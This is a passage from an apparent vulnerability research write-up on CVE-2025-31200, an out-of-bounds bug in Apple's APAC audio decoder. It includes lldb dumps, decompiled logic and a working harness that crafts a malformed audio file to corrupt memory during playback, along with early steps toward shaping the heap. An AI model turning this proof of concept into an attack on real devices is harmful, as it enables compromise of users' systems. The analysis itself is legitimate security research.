</span></span></span><span><span>4</span><span><span>; ... ...
</span></span></span><span><span>5</span><span><span></span>cmp    <span>w13</span>, <span>w12</span>            <span>; Compare processed values
</span></span></span><span><span>6</span><span><span></span>b<span>.eq</span>   <span>success</span>             <span>; Found match!
</span></span></span><span><span>7</span><span><span></span>add    <span>x8</span>, <span>x8</span>, #<span>0x4</span>        <span>; Next supported tag
</span></span></span><span><span>8</span><span><span></span>cmp    <span>x8</span>, <span>x9</span>              <span>; End of list?
</span></span></span><span><span>9</span><span><span></span>b<span>.ne</span>   <span>loop</span>                <span>; Continue if more tags
</span></span></span></code></pre></div><p>My layout was <code>0x00be</code> (the CoreAudio HOA format tag). It was compared against a number of apparently supported values until it found 0x00be. It then returned 0, which fixed the error! However, if I just let it continue from there, then there still was no crash, and lldb showed the same exact error message as before: “ERROR: Wrong profile index in GlobalConfig.” Lets break down the error checking sequence at the callsite even further:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>x23</span> <span>=</span> <span>return_value</span><span>;</span>  <span>// x23 = 0 (Profile 0, Level 0)
</span></span></span><span><span> 2</span><span><span></span>
</span></span><span><span> 3</span><span><span>// Check 1: Did function return failure?
</span></span></span><span><span> 4</span><span><span></span><span>if</span> <span>(</span><span>!</span><span>(</span><span>0xffff</span> <span>&amp;</span> <span>~</span><span>x23</span><span>))</span> <span>{</span>  <span>// !(0xffff &amp; ~0) = !(0xffff) = false
</span></span></span><span><span> 5</span><span><span></span>    <span>// This check passes - function didn&#39;t return 0xffff
</span></span></span><span><span> 6</span><span><span></span><span>}</span>
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>// Check 2: Is current profile valid?
</span></span></span><span><span> 9</span><span><span></span><span>w0</span> <span>=</span> <span>*</span><span>(</span><span>uint16_t</span><span>*</span><span>)(</span><span>global_config</span> <span>+</span> <span>0x20</span><span>);</span>  <span>// w0 = 5 (current profile)
</span></span></span><span><span>10</span><span><span></span><span>if</span> <span>(</span><span>w0</span> <span>&gt;</span> <span>0x1f</span><span>)</span> <span>{</span>  <span>// 5 &gt; 31? No
</span></span></span><span><span>11</span><span><span></span>    <span>// This check passes
</span></span></span><span><span>12</span><span><span></span><span>}</span>
</span></span><span><span>13</span><span>
</span></span><span><span>14</span><span><span>// Check 3: Is inferred profile valid?  
</span></span></span><span><span>15</span><span><span></span><span>w8</span> <span>=</span> <span>x23</span> <span>&amp;</span> <span>0xffff</span><span>;</span>  <span>// w8 = 0 (inferred profile)
</span></span></span><span><span>16</span><span><span></span><span>if</span> <span>(</span><span>w8</span> <span>&gt;</span> <span>0x1f</span><span>)</span> <span>{</span>  <span>// 0 &gt; 31? No  
</span></span></span><span><span>17</span><span><span></span>    <span>// This check passes
</span></span></span><span><span>18</span><span><span></span><span>}</span>
</span></span><span><span>19</span><span>
</span></span><span><span>20</span><span><span>// Check 4: Is current profile compatible with inferred?
</span></span></span><span><span>21</span><span><span></span><span>if</span> <span>(</span><span>w0</span> <span>&gt;</span> <span>(</span><span>x23</span> <span>&amp;</span> <span>0xffff</span><span>))</span> <span>{</span>  <span>// 5 &gt; 0? YES!
</span></span></span><span><span>22</span><span><span></span>    <span>// ERROR: Current profile (5) &gt; inferred profile (0)
</span></span></span><span><span>23</span><span><span></span><span>}</span></span></span></code></pre></div><p>The function did find a match for the tag <code>0x00be0078</code>, but it found it in the <strong>wrong profile’s supported tags list.</strong> The function searches backwards from <code>main_profile</code> toward <code>low_profile</code>. Since it found <code>0x00be</code> in the low_profile list, it returned Profile 0 instead of a higher profile. But GlobalConfig is for some reason set to profile 5. Since 5 &gt; 0, it fails with “Wrong profile index in GlobalConfig.”  Essentially, <code>GlobalConfig</code> found 0x00be0078 in profile zero’s configuration. This was puzzling. the function <strong>was</strong> finding my HOA format, but returning the wrong profile.</p>
<p>I dumped the <code>kSupportedProfileLevels</code> array that maps specific configurations to profiles:</p>





<pre tabindex="0"><code>(lldb) x/32wx *(uint64_t*)($x1)
0x10073a59c: 0x00000000 0x000f0001 0x000f0002 0x000f0003
0x10073a5ac: 0x000f0004 0x00020005 0x000f0006 0x000f0007
...
0x10073a60c: 0x000f001c 0x000f001d 0x000f001e 0x0006001f</code></pre><p>Notably, there’s no <code>0x00be0078</code> entry. After some more confusion I took a look at the <code>kSupportedACLTags</code>:</p>





<pre tabindex="0"><code>(lldb) x/64x *(uint64_t*)$x1+0x80
0x10073a61c: 0x00640001 0x00650002 0x00720003 0x006c0004
0x10073a62c: 0x00740004 0x00780005 0x007c0006 0x008d0006
...
0x10073a70c: 0x00730004 0x00750005 0x00790006 0x00830003</code></pre><p>Since my GlobalConfig was set to Profile 5, I needed to find a channel count that would map to Profile 5. Looking at the <code>kSupportedProfileLevels</code> array, I found <code>0x00020005</code> which decodes to:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>0x00020005</span> <span>=</span> <span>(</span><span>Level</span> <span>2</span> <span>&lt;&lt;</span> <span>16</span><span>)</span> <span>|</span> <span>Profile</span> <span>5</span>
</span></span><span><span>2</span><span><span>// This means some configuration maps to Profile 5, Level 2
</span></span></span></code></pre></div><p>The question was: which input produces this output? The pattern suggested it would be a HOA layout with fewer channels. Since the return value <code>0x00020005</code> indicated 5 channels were involved, I tried:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> 
</span></span><span><span>2</span><span>    <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0x5</span><span>;</span></span></span></code></pre></div><p>This time, the function returned <code>0x00020005</code> - exactly matching the profile levels table entry! The validation passed because:</p>
<ul>
<li>Current GlobalConfig Profile: <strong>5</strong></li>
<li>Inferred Profile: <strong>5</strong></li>
<li>Check: <code>5 ≤ 5</code> passes!</li>
</ul>
<p>This worked!</p>
<h2 id="playback">Playback</h2>
<p>When I ran the harness in lldb all I saw was: <code>Process * exited with status = 0 (0x00000000)</code>. At least according to the deserializer, we managed to create a valid APAC magic cookie. However, still no crash, nor any message from ASan. The most interesting thing to me was that this new audio file showed the exact same error message on the new version as before (it was still hitting the new check!), and showed nothing on the unpatched version.</p>
<p>When I saw this I really didn’t know where to look. I thought that the process of looking at the diff between the two versions would be enough. Here it is again as I was looking at it at this point, cleaned up:</p>
<p><img alt="Screenshot 2025-05-30 at 7.52.36\u202fPM.png" src="https://blog.benjojo.co.uk/posts/cve-2025-31200/images/finalDiff.png"/></p>
<p>This was essentially <em>all</em> that had changed. I took a break for a while here, and worked on another project that had spawned out of this one (a way to do runtime patching which actually works for these system libraries on MacOS since I couldn’t get TinyINST or even Frida to work). Chasing down this AudioCodecs bug seemed out of reach. I mean there are so many possible places that the code could go in the enormous MacOS audio processing pipeline. Without a clear diff between two binaries with the issue, as I had had until this point, where would I even look?</p>
<p>As I worked on my other project, I kept thinking about this. Eventually I decided to take some time to try and come at it from a slightly different angle. Maybe it would help to understand a bit about what’s actually being done by the code at the level of audio processing more than just control flow/code itself.</p>
<p>I looked for references to <code>m_TotalComponents</code> in <code>apac::hoa::CodecConfig::Deserialize</code>. It is calculated in the following kind of snippet (much like everything else in this method):</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>if</span> <span>(</span><span>this</span><span>-&gt;</span><span>some_flag</span> <span>==</span> <span>1</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>	<span>uint32_t</span> <span>AmbisonicOrder</span> <span>=</span> <span>apac</span><span>::</span><span>GetEscBits</span><span>&lt;</span><span>6u</span><span>,</span> <span>8u</span><span>&gt;</span><span>(</span><span>readerPtr</span><span>,</span> <span>numBits</span><span>);</span>
</span></span><span><span> 3</span><span>	<span>numHoaCoeffs</span> <span>=</span> <span>(</span><span>AmbisonicOrder</span> <span>+</span> <span>1</span><span>)</span> <span>*</span> <span>(</span><span>AmbisonicOrder</span> <span>+</span> <span>1</span><span>);</span>
</span></span><span><span> 4</span><span>	<span>// The number of HOA coeffs for order N is (N + 1)²
</span></span></span><span><span> 5</span><span><span></span>	<span>m_maxNumSalientComponents</span> <span>=</span> <span>apac</span><span>::</span><span>GetEscBits</span><span>&lt;</span><span>6u</span><span>,</span> <span>8u</span><span>&gt;</span><span>(</span><span>readerPtr</span><span>,</span> <span>numBits</span><span>);</span>
</span></span><span><span> 6</span><span>	<span>uint32_t</span> <span>numBits</span> <span>=</span> <span>floor</span><span>(</span><span>log2</span><span>(</span><span>this</span><span>-&gt;</span><span>numHoaCoeffs</span><span>));</span>
</span></span><span><span> 7</span><span>	<span>/*
</span></span></span><span><span> 8</span><span><span>	Parse numScalarCodedComponents from the stream.
</span></span></span><span><span> 9</span><span><span>	The number of HOA Coefficients determines numScalarCodedComponents
</span></span></span><span><span>10</span><span><span>	log2(n) gives how many bits are needed to represent n
</span></span></span><span><span>11</span><span><span>	*/</span>
</span></span><span><span>12</span><span>	<span>this</span><span>-&gt;</span><span>m_TotalComponents</span> <span>=</span> <span>numScalarCodedComponents</span> <span>+</span> <span>m_maxNumSalientComponents</span><span>;</span>
</span></span><span><span>13</span><span><span>}</span>
</span></span><span><span>14</span><span><span>// Some checks to ensure this state is okay:
</span></span></span><span><span>15</span><span><span></span><span>if</span> <span>(</span><span>numHoaCoeffs</span> <span>&lt;</span> <span>122</span> <span>&amp;&amp;</span> <span>m_maxNumSalientComponents</span> <span>&lt;=</span> <span>numHoaCoeffs</span> <span>&amp;&amp;</span> <span>numScalarCodedComponents</span> <span>&lt;=</span> <span>numHoaCoeffs</span><span>)</span> <span>{</span>
</span></span><span><span>16</span><span>	<span>// Continue with parsing
</span></span></span><span><span>17</span><span><span></span><span>}</span>
</span></span><span><span>18</span><span><span>else</span> <span>{</span>
</span></span><span><span>19</span><span>	<span>// Log error
</span></span></span><span><span>20</span><span><span></span><span>}</span></span></span></code></pre></div><p>Here is what I believe to be true about the different audio terms of jargon here:</p>
<ul>
<li><strong>Components</strong> are spatial/directional elements (salient vs. ambient/scalar)
<ul>
<li>Think the difference between highlighted important noise coming at you from some particular direction, and just embient noise in the background.</li>
</ul>
</li>
<li><strong>Subbands</strong> are frequency divisions</li>
<li><strong>Salient Components</strong> (<code>m_maxNumSalientComponents</code>): The most important spatial features, encoded with high precision</li>
<li><strong>Scalar/Direct Components</strong> (<code>numScalarCodedComponents</code>): Less important components using simpler scalar coding</li>
<li><strong>Ambient data</strong>, which is sized per-subband as you always need background spatial info for each frequency band</li>
</ul>
<p>My understanding is that there are essentially three types of components, and two of them, <code>m_maxNumSalientComponents</code> and <code>numScalarCodedComponents</code>, add together to be <code>m_TotalComponents</code>. Thinking back to the fix being essentially:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>-</span> <span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>uint8_t</span><span>&gt;</span> <span>m_RemappingArray</span><span>(</span><span>m_ChannelLayoutTag</span><span>);</span>
</span></span><span><span>2</span><span><span>+</span> <span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>uint8_t</span><span>&gt;</span> <span>m_RemappingArray</span><span>(</span><span>m_TotalComponenets</span><span>);</span></span></span></code></pre></div><p>The fact that the remapping array was initially sized by Apple based on the <a href="https://developer.apple.com/documentation/coreaudiotypes/1572101-audio_channel_layout_tags?changes=_7&amp;language=objc">ChannelLayoutTag</a> (the bottom two bytes of which indicate the number of channels), tells us that there is a relationship between the number of channels and the remapping array. I was trying to understand what that relationship could even be. According to <a href="https://www.wildlifeacoustics.com/resources/faqs/what-is-an-audio-channel?token=iHleyIFjO6AyNj0dwv2pyKSq5_BGTm76">wildlifeacoustics.com</a>, “a channel is a representation of sound coming from or going to a single point. A single microphone can produce one channel of audio, and a single speaker can accept one channel of audio, for example.” Presumably then, the <code>m_RemappingArray</code> is a way of mapping the spatial components of HOA to a given channel based layout. Therefore, there must be some later stage in the audio processing pipeline that actually “remaps” the spatial components to the channel layout. If there is some mismatch between the two, perhaps it <em>tries</em> to remap one based on the other, and ends up reaching out of bounds since they are different sizes?</p>
<p>It turns out that is precisely the exploit primitive.</p>
<h2 id="the-bug">The Bug</h2>
<p>I should have realized this earlier, but if we actually <em>play</em> the audio in addition to just <em>preparing to play</em> as our harness did, then that is very plausibly when the remapping occurs. I hadn’t tried this before because the vulnerable code section, as found through diffing, is perfectly reachable without ever actually playing the audio. You can just call <code>[AVAudioPlayer prepareToPlay]</code>. However, if we add in that single line of code to our harness, then with the exact audio file we have at this stage then we segfault inside a call to <code>memmove</code>!</p>
<p><img alt="Screenshot 2025-05-30 at 11.51.31\u202fPM.png" src="https://blog.benjojo.co.uk/posts/cve-2025-31200/images/memMoveSegfault.png"/></p>
<p>Just to be clear, here is how I was setting up the audio file at this point:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>// Run this function through an lldb hook in 
</span></span></span><span><span> 2</span><span><span>// apac::hoa::CodecConfig::Serialize
</span></span></span><span><span> 3</span><span><span></span><span>void</span> <span>OverrideApac</span><span>(</span><span>CodecConfig</span><span>*</span> <span>config</span><span>)</span> <span>{</span>
</span></span><span><span> 4</span><span>  <span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0x8</span><span>;</span> <span>// Create the mismatch without triggering the error in GlobalConfig
</span></span></span><span><span> 5</span><span><span></span>	<span>config</span><span>-&gt;</span><span>m_RemappingArray</span><span>.</span><span>push_back</span><span>(</span><span>0xff</span><span>);</span> <span>// Again it doesn&#39;t seem like this value actually gets read in to the m_RemappingArray, but we do need to initialize it,
</span></span></span><span><span> 6</span><span><span></span>	<span>// Otherwise serialize segfaults.
</span></span></span><span><span> 7</span><span><span></span><span>}</span>
</span></span><span><span> 8</span><span>
</span></span><span><span> 9</span><span><span>int</span> <span>main</span><span>()</span> <span>{</span>
</span></span><span><span>10</span><span>  <span>uint32_t</span> <span>channelNum</span> <span>=</span> <span>1</span><span>;</span>
</span></span><span><span>11</span><span>  <span>AVAudioFormat</span><span>*</span> <span>formatIn</span> <span>=</span> <span>[[</span><span>AVAudioFormat</span> <span>alloc</span><span>]</span> <span>initStandardFormatWithSampleRate</span><span>:</span><span>44100</span>
</span></span><span><span>12</span><span>                                                                           <span>channels</span><span>:</span><span>channelNum</span><span>];</span>
</span></span><span><span>13</span><span>  <span>AudioStreamBasicDescription</span> <span>outputDescription</span><span>{.</span><span>mSampleRate</span> <span>=</span> <span>44100</span><span>,</span>
</span></span><span><span>14</span><span>                                                <span>.</span><span>mFormatID</span> <span>=</span> <span>kAudioFormatAPAC</span><span>,</span>
</span></span><span><span>15</span><span>                                                <span>.</span><span>mFormatFlags</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>16</span><span>                                                <span>.</span><span>mBytesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>17</span><span>                                                <span>.</span><span>mFramesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>18</span><span>                                                <span>.</span><span>mBytesPerFrame</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>19</span><span>                                                <span>.</span><span>mChannelsPerFrame</span> <span>=</span> <span>channelNum</span><span>,</span>
</span></span><span><span>20</span><span>                                                <span>.</span><span>mBitsPerChannel</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>21</span><span>                                                <span>.</span><span>mReserved</span> <span>=</span> <span>0</span><span>};</span>
</span></span><span><span>22</span><span>  <span>AVAudioChannelLayout</span><span>*</span> <span>channelLayout</span> <span>=</span>
</span></span><span><span>23</span><span>      <span>[</span><span>AVAudioChannelLayout</span> <span>layoutWithLayoutTag</span><span>:</span><span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>channelNum</span><span>];</span>
</span></span><span><span>24</span><span>
</span></span><span><span>25</span><span>  <span>NSURL</span><span>*</span> <span>outUrl</span> <span>=</span> <span>[</span><span>NSURL</span> <span>fileURLWithPath</span><span>:</span><span>@</span><span>&#34;output.mp4&#34;</span><span>];</span>
</span></span><span><span>26</span><span>
</span></span><span><span>27</span><span>  <span>OSStatus</span> <span>status</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>28</span><span>
</span></span><span><span>29</span><span>  <span>ExtAudioFileRef</span> <span>audioFile</span> <span>=</span> <span>nullptr</span><span>;</span>
</span></span><span><span>30</span><span>  
</span></span><span><span>31</span><span>  <span>ExtAudioFileCreateWithURL</span><span>((</span><span>__bridge</span> <span>CFURLRef</span><span>)</span><span>outUrl</span><span>,</span> <span>kAudioFileMPEG4Type</span><span>,</span> <span>&amp;</span><span>outputDescription</span><span>,</span>
</span></span><span><span>32</span><span>                                <span>channelLayout</span><span>.</span><span>layout</span><span>,</span> <span>kAudioFileFlags_EraseFile</span><span>,</span> <span>&amp;</span><span>audioFile</span><span>);</span>
</span></span><span><span>33</span><span>
</span></span><span><span>34</span><span>  <span>ExtAudioFileSetProperty</span><span>(</span><span>audioFile</span><span>,</span> <span>kExtAudioFileProperty_ClientDataFormat</span><span>,</span>
</span></span><span><span>35</span><span>                                   <span>sizeof</span><span>(</span><span>AudioStreamBasicDescription</span><span>),</span> <span>formatIn</span><span>.</span><span>streamDescription</span><span>);</span>
</span></span><span><span>36</span><span>  <span>ExtAudioFileSetProperty</span><span>(</span><span>audioFile</span><span>,</span> <span>kExtAudioFileProperty_ClientChannelLayout</span><span>,</span>
</span></span><span><span>37</span><span>                                   <span>sizeof</span><span>(</span><span>AudioChannelLayout</span><span>),</span> <span>formatIn</span><span>.</span><span>channelLayout</span><span>.</span><span>layout</span><span>);</span>
</span></span><span><span>38</span><span>                                   
</span></span><span><span>39</span><span>  <span>float</span> <span>audioBuffer</span><span>[</span><span>44100</span><span>]</span> <span>=</span> <span>{};</span>
</span></span><span><span>40</span><span>  <span>AudioBufferList</span> <span>audioBufferList</span><span>{</span>
</span></span><span><span>41</span><span>      <span>.</span><span>mNumberBuffers</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span>42</span><span>      <span>.</span><span>mBuffers</span> <span>=</span>
</span></span><span><span>43</span><span>          <span>{</span>
</span></span><span><span>44</span><span>              <span>{</span>
</span></span><span><span>45</span><span>                  <span>.</span><span>mNumberChannels</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span>46</span><span>                  <span>.</span><span>mDataByteSize</span> <span>=</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>),</span>
</span></span><span><span>47</span><span>                  <span>.</span><span>mData</span> <span>=</span> <span>audioBuffer</span><span>,</span>
</span></span><span><span>48</span><span>              <span>},</span>
</span></span><span><span>49</span><span>          <span>},</span>
</span></span><span><span>50</span><span>  <span>};</span>
</span></span><span><span>51</span><span>  
</span></span><span><span>52</span><span>  <span>ExtAudioFileWrite</span><span>(</span><span>audioFile</span><span>,</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>)</span> <span>/</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>[</span><span>0</span><span>]),</span> <span>&amp;</span><span>audioBufferList</span><span>);</span>
</span></span><span><span>53</span><span>
</span></span><span><span>54</span><span>  <span>ExtAudioFileDispose</span><span>(</span><span>audioFile</span><span>);</span>
</span></span><span><span>55</span><span>
</span></span><span><span>56</span><span>  <span>audioFile</span> <span>=</span> <span>nullptr</span><span>;</span>
</span></span><span><span>57</span><span>  <span>return</span> <span>0</span><span>;</span>
</span></span><span><span>58</span><span><span>}</span></span></span></code></pre></div><p>By creating the audio file this way, Apple’s encoder sets the number of total components to 1, but then by modifying the <code>m_ChannelLayoutTag</code> during <code>apac::hoa::CodecConfig::Serialize</code> we force the serializer to create the mismatch. There are only certain profiles that are supported, as discussed above, so the number of channels in the channel layout tag has to be one of the supported profiles.</p>
<p>The crash occured most often as a null pointer dereference in <code>apac::HOADecoder::DecodeAPACFrame</code>. <code>x26</code> here hasn’t yet been initialized:</p>





<p>so we crash with EXC_BAD_ACCESS (code=1, address=0x19). If we enable Guard Malloc in Xcode then we can see the first invalid read occurs in <code>APAC::ChannelRemapper::Process</code>.</p>
<p><img alt="Guard Malloc showing invalid read" src="https://blog.benjojo.co.uk/posts/cve-2025-31200/images/guardmalloc.png"/></p>
<p>Image courtesy of Zhouwei</p>
<p>If we look at the assembly where the invalid read occurs its clear that it is trying to read some value from an array, and x8 + x11«3 points out of bounds. This of course, all makes perfect sense. The method is called <code>APACChannelRemapper::Process</code>. This must be where the channel remapping actually occurs. The instruction directly above the one that Guard Malloc catches, also tells us a lot about what is going on:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span>ldr <span>x8</span>, <span>[</span><span>x1</span><span>]</span>
</span></span><span><span>2</span><span>ldr <span>x9</span>, <span>[</span><span>x8</span>, <span>x11</span>, <span>lsl</span> #<span>3</span><span>]</span></span></span></code></pre></div><p>x1, which, given Arm calling conventions is most likely argument two, is a pointer to some kind of vector of pointers. Taking a look in Binary Ninja, this method is relatively straightforward. It essentially takes two input paramaters: a pointer to <code>this</code>, an <code>ApacChannelRemapper</code> and a pointer to a <code>std::vector&lt;float*&gt;</code>:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>ApacChannelRemapper</span> <span>{</span>
</span></span><span><span>2</span><span>	<span>struct</span> <span>_vtable_for_ApacChannelRemapper</span><span>*</span> <span>vtable</span><span>;</span>
</span></span><span><span>3</span><span>	<span>uint8_t</span><span>*</span> <span>remapStart</span><span>;</span> 
</span></span><span><span>4</span><span>	<span>uint8_t</span><span>*</span> <span>remapEnd</span><span>;</span>
</span></span><span><span>5</span><span><span>};</span>
</span></span><span><span>6</span><span>
</span></span><span><span>7</span><span><span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>float</span><span>*&gt;</span> <span>channelBuffer</span><span>;</span></span></span></code></pre></div><p>I took a look at runtime at function entry, and it turns out that the <code>ApacChannelRemapper</code> object contains the <code>m_RemappingArray</code> from earlier:</p>





<pre tabindex="0"><code>(lldb) mem read --count `*(uint64_t*)($x0+0x10)-*(uint64_t*)($x0+0x8)` --format hex --size 1 -- *(uint64_t*)($x0+0x8) 
0x600003674910: 0x00 0x00 0x03 0x00 0x00 0x00 0x06 0x00</code></pre><p>We read in size 1 since the <code>m_RemappingArray</code> is an array of bytes. On the other hand, the vector that gets passed as the second argument is a vector of pointers to floats. We can read the size:</p>





<pre tabindex="0"><code>(lldb)  p (*(uint64_t*)($x1+0x8)-*(uint64_t*)($x1))/8
(uint64_t) 1</code></pre><p>That is the mismatch! The <code>m_RemappingArray</code> has the size we forced it to have by hijacking the serialization of the <code>m_ChannelLayoutTag</code> whereas the actual float buffer being passed in argument 2 only has <code>m_TotalComponents</code> elements. It is worth understanding exactly what this remapping function does, as that will make it clearer how to write what we want, where we want. It’s fairly simple:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>int</span> <span>APACChannelRemapper</span><span>::</span><span>Process</span><span>(</span><span>struct</span> <span>remapper</span> <span>*</span><span>remapVec</span><span>,</span> <span>float</span><span>**</span> <span>floatVec</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>
</span></span><span><span> 3</span><span>    <span>if</span> <span>(</span><span>remapStartAddr</span> <span>==</span> <span>remapEndAddr</span><span>)</span> <span>{</span>
</span></span><span><span> 4</span><span>        <span>return</span> <span>0</span><span>;</span> <span>// No remapping to do
</span></span></span><span><span> 5</span><span><span></span>    <span>}</span>
</span></span><span><span> 6</span><span>    <span>uint64_t</span> <span>outerIdx</span> <span>=</span> <span>0</span><span>;</span> 
</span></span><span><span> 7</span><span>    <span>uint64_t</span> <span>remapStartIndex</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span> 8</span><span>    <span>uint64_t</span> <span>index</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span> 9</span><span>    
</span></span><span><span>10</span><span>    <span>while</span> <span>(</span><span>outerIdx</span> <span>&lt;</span> <span>remapVec</span><span>-&gt;</span><span>size</span><span>)</span> <span>{</span>
</span></span><span><span>11</span><span>        <span>index</span> <span>=</span> <span>outerIdx</span><span>;</span>
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span>        <span>while</span> <span>(</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]</span> <span>&gt;=</span> <span>index</span><span>)</span> <span>{</span> <span>// Follow the &#39;cycle&#39;
</span></span></span><span><span>14</span><span><span></span>            <span>index</span> <span>=</span> <span>remapVec</span><span>[</span><span>remapStartIndex</span><span>];</span> 
</span></span><span><span>15</span><span>        <span>}</span>
</span></span><span><span>16</span><span>        <span>if</span> <span>(</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]</span> <span>!=</span> <span>index</span><span>)</span> <span>{</span> <span>// We found an entry that is a &#39;good swap&#39;
</span></span></span><span><span>17</span><span><span></span>            <span>float</span><span>*</span> <span>swapone</span> <span>=</span> <span>floatVec</span><span>[</span><span>index</span><span>];</span> 
</span></span><span><span>18</span><span>            <span>float</span><span>*</span> <span>swaptwo</span> <span>=</span> <span>floatVec</span><span>[</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]];</span>
</span></span><span><span>19</span><span>            <span>floatVec</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>swaptwo</span><span>;</span> 
</span></span><span><span>20</span><span>            <span>floatVec</span><span>[</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]]</span> <span>=</span> <span>swapone</span><span>;</span>
</span></span><span><span>21</span><span>        <span>}</span>
</span></span><span><span>22</span><span>        <span>outerIdx</span><span>++</span><span>;</span>
</span></span><span><span>23</span><span>    <span>}</span>
</span></span><span><span>24</span><span>    <span>return</span> <span>0</span><span>;</span>
</span></span><span><span>25</span><span><span>}</span></span></span></code></pre></div><p>Maybe it’s telling of my computer science fundamentals, but I had never seen this idea before. Apparently you can permute a vector according to some desired layout in constant space with the method above.</p>
<p>Essentially, if you have a vector, say [A,B,C] that you actually want to be [B,A,C], then you might do that with a ‘permutation map’: another vector that says where each element should go. In this case that would be [1,0,2], which means that the element at index 1 should go to index 0, and the element at index 0 should go to index 1 and the element at index 2 should stay where it is.  The simplest working way to do this is to just allocate another vector, and essentially use the permutation map as a kind of dictionary (index→element) for populating that third vector. However, if you would rather be clever and don’t feel like allocating a whole other vector, then you can use the algorithm above.</p>
<p>For us this means that the input remapping is a map that we can use to read and write out of bounds. Notice that both <code>remapVec</code> and the input <code>floatVec</code> are assumed to be ‘well-behaved’ in their own way? If, for example, the <code>remapVec</code> looked like this [1,2,3], then the inner while loop would happily read in memory from out of bounds. Given that this function is executed under the condition that we created earlier where the <code>remapVec</code> is larger than the actual <code>floatVec</code>, then there can be elements in <code>remapVec</code> that are larger than the size of <code>floatVec</code>, each of which will cause a ‘swap’ with some memory from out bounds. This is the illegal read we saw earlier under Guard Malloc. Similarly though, for every read that gets written into the remapping array during this function, there is an equivalent write. This is the primitive.</p>
<p>As it stands though, the float pointers being swapped from out of bounds are being swapped almost always with zeros (though it depends on the specific heap layout), and then quickly dereferenced, hence the segfault. If we want it not to segfault then we need to understand a few things in more detail:</p>
<ol>
<li>The <code>m_RemappingArray</code> and how to control it</li>
<li>The heap layout around the float vector</li>
<li>The control flow following the <code>APACChannelRemapper::Process</code> method</li>
</ol>
<p>In order to turn this into a real arbitrary write, we would, I think, need to understand much more deeply where in the actual audio processing pipeline this method happens. <em>This would be a great investigation if somebody wants to look into it</em>. I have found that the float vectors are clearly related to the audio data per frame. It seems that the heap layout is affected by the number of channels we pick (since of course this changes the size of the remapping array), and I have found that if I pick a number for the number of channels that is only slightly smaller than the number given in the layout tag:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span>
</span></span><span><span> 2</span><span><span>void</span> <span>PatchCodecConfig</span><span>(</span><span>CodecConfig</span><span>*</span> <span>config</span><span>)</span> <span>{</span>
</span></span><span><span> 3</span><span>    <span>uint32_t</span> <span>num_channels</span> <span>=</span> <span>13</span><span>;</span>
</span></span><span><span> 4</span><span>    <span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>num_channels</span><span>;</span>
</span></span><span><span> 5</span><span>    <span>config</span><span>-&gt;</span><span>m_RemappingArray</span><span>.</span><span>push_back</span><span>(</span><span>0x3</span><span>);</span>
</span></span><span><span> 6</span><span><span>}</span>
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>int</span> <span>main</span><span>()</span> <span>{</span>
</span></span><span><span> 9</span><span>    <span>uint32_t</span> <span>channelNum</span> <span>=</span> <span>12</span><span>;</span>
</span></span><span><span>10</span><span>    <span>AVAudioChannelLayout</span><span>*</span> <span>channelLayout</span> <span>=</span>
</span></span><span><span>11</span><span>        <span>[</span><span>AVAudioChannelLayout</span> <span>layoutWithLayoutTag</span><span>:</span><span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>channelNum</span><span>];</span>
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span>    <span>AVAudioFormat</span><span>*</span> <span>formatIn</span> <span>=</span> <span>[[</span><span>AVAudioFormat</span> <span>alloc</span><span>]</span> <span>initWithCommonFormat</span><span>:</span><span>AVAudioPCMFormatInt32</span>
</span></span><span><span>14</span><span>                                                              <span>sampleRate</span><span>:</span><span>44100</span>
</span></span><span><span>15</span><span>                                                             <span>interleaved</span><span>:</span><span>YES</span> <span>//ensure that we mark the channels as interleaved
